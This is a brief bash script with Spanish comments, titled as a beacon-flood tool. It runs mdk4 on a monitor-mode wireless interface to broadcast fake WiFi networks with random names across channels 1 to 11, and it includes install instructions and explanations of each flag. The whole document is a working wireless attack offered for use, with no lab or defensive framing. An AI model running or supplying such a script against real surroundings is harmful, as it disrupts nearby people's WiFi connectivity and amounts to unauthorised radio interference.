#!/bin/bash
# BEACON_FLOOD.sh - Inundación de redes falsas

INTERFAZ="wlan0mon"

echo "🔥 INUNDANDO CON REDES FALSAS 🔥"
echo "Los dispositivos verán cientos de redes WiFi nuevas"

# mdk4 es más potente que aireplay para esto
# Instalar si no está: sudo apt install mdk4

sudo mdk4 $INTERFAZ b -n -c 1-11
# b = beacon flood
# -n = redes con nombres aleatorios
# -c = canales 1 al 11